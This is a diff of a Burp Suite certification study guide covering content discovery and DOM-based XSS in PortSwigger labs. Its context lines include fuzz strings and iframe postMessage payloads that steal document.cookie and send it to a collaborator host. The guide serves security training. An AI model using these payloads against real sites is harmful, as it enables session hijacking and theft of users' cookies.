@@ -45,7 +45,7 @@
   
 # Content Discovery  
 
->Enumeration of target start with fuzzing web directories and files. Either use the Burp engagement tools, content discovery option to find hidden paths and files or use ```FFUF``` to enumerate web directories and files. Evening looking at ```robots.txt``` or ```sitemap.xml``` can reveal content.  
+>Enumeration of target start with fuzzing web directories and files. Either use the Burp engagement tools, content discovery option to find hidden paths and files or use ```FFUF``` to enumerate web directories and files. Looking at ```robots.txt``` or ```sitemap.xml``` that can reveal content.  
 
 ```bash
 wget https://raw.githubusercontent.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/main/wordlists/burp-labs-wordlist.txt
@@ -88,13 +88,13 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 ### Identify DOM-XSS  
 
 >DOM-based XSS vulnerabilities arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes code to a sink that supports dynamic code execution. 
->Test the what characters enable escaping the `source code` injection point, fuzzer string.  
+>Test which characters enable the escaping out of the `source code` injection point, by using the fuzzer string below.  
 
 ```
 <>\'\"<script>{{7*7}}$(alert(1)}fuzzer
 ```  
 
->Review the code to ***identify*** the **sources** , **sinks** or **methods** that may lead to exploit, list of samples:  
+>Review the `source code` to ***identify*** the **sources** , **sinks** or **methods** that may lead to exploit, list of samples:  
 
 * document.write()  
 * window.location  
@@ -119,7 +119,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
   
 ### Vuln AngularJS  
   
->AngularJS expression below can be injected into the search function when angle brackets and double quotes HTML-encoded. The vulnerability is ***identified*** by noticing the search string is enclosed in an **ng-app** directive and ```/js/angular 1-7-7.js``` script. Review the HTML code to ***identify*** the ```ng-app``` directive telling AngularJS that this is the root element of the AngularJS application.  
+>AngularJS expression below can be injected into the search function when angle brackets and double quotes HTML-encoded. The vulnerability is ***identified*** by noticing the search string is enclosed in an **ng-app** directive and ```/js/angular 1-7-7.js``` script included. Review the HTML code to ***identify*** the ```ng-app``` directive telling AngularJS that this is the root element of the AngularJS application.  
 
 ![domxss-on-constructor.png](images/ng-app-code-review.png)  
 
@@ -149,7 +149,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ![DOM-XSS doc write inside select](images/dom-xss-doc-write-inside-select.png)  
 
->Test to validate the identification of the injection into modified GET request.  
+>Perform the a test using below payload to ***identify*** the injection into the modified GET request.  
 
 ```html
 /product?productId=1&storeId=fuzzer"></select>fuzzer
@@ -169,7 +169,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ### Dom Invader  
 
->Using Dom Invader plug-in and set the canary to value, such as ```domxss``` and detect DOM-XSS sinks that can be exploit.  
+>Using Dom Invader plug-in and set the canary to value, such as ```domxss```, it will detect DOM-XSS sinks that can be exploit.  
 
 ![DOM Invader](images/dom-invader.png)  
 
@@ -211,7 +211,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 </script>
 ```  
 
->To exploit the above code, inject JavaScript into the **JSON** data to change "load-channel" field data and steal document cookie.  
+>To exploit the above `source code`, inject JavaScript into the **JSON** data to change "load-channel" field data and steal document cookie.  
   
 >Host an **iframe** on the exploit server html body, and send it to the victim, resulting in the stealing of their cookie. The victim cookie is send to the Burp collaboration server.  
 
@@ -224,8 +224,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 ```  
 
 >At the end of the iframe onload values is a "*", this is to indicate the target is any.  
-
-
+  
 [PortSwigger Lab: DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)  
 
 ![DOM Invader identify web messages](images/dom-invader-identify-web-messages.png)  
@@ -245,11 +244,11 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ### DOM XSS AddEventListener JavaScript URL  
 
->Reviewing the page `source code` we ***identify*** the ```addeventlistener``` call for a web message but there is if condition checking if strings contains ```http/s```.
+>Reviewing the page `source code` we ***identify*** the ```addeventlistener``` call for a web message but there is an `if` condition checking if the string contains ```http/s```.  
 
 ![source-code-web-message-url.png](images/source-code-web-message-url.png)  
 
->The exploit server hosted payload below includes the ```https``` string, and is successful in bypassing the if condition check.  
+>The exploit server hosted payload below includes the ```https``` string, and is successful in bypassing the `if` condition check.  
 
 ```html
 <iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:document.location=`https://Collaborator.com?c=`+document.cookie','*')">
@@ -261,11 +260,11 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
   
 ### DOM XSS AddEventListener Ads Message  
 
->In the `source code` we ***identify*** the call using ```addEventListener``` and element id ```ads``` reference.  
+>In the `source code` we ***identify*** the call using ```addEventListener``` and an element id ```ads``` being referenced.  
 
 ![Source code web message ads](images/source-code-web-message-ads.png)  
 
->The ```fetch``` function enclose the collaborator target inside back ticks, and when the iframe loads on the victim browser, the postMessage() method sends a web message to their home page.  
+>The ```fetch``` function enclose the collaborator target inside **back ticks**, and when the iframe loads on the victim browser, the postMessage() method sends a web message to their home page.  
 
 ```html
 <iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://COLLABORATOR.com?collector=`+btoa(document.cookie))>','*')">
